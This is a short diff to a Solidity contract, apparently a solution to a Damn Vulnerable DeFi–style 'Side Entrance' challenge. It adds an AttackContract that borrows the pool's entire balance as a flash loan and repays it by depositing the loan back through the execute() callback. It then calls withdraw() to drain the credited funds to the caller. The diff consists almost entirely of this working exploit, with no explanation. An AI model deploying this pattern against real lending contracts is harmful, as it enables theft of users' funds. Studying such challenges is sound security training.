@@ -2,7 +2,7 @@
 pragma solidity 0.8.17;
 
 import {Address} from "openzeppelin-contracts/utils/Address.sol";
-
+ 
 interface IFlashLoanEtherReceiver {
     function execute() external payable;
 }
@@ -39,4 +39,26 @@ contract SideEntranceLenderPool {
             revert FlashLoanHasNotBeenPaidBack();
         }
     }
+}
+
+contract AttackContract {
+
+    SideEntranceLenderPool public pool;
+
+    constructor(address _pool){
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    receive() external payable {}
+
+    function attack() public {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() public payable{
+        pool.deposit{value: msg.value}();
+    }
+
 }
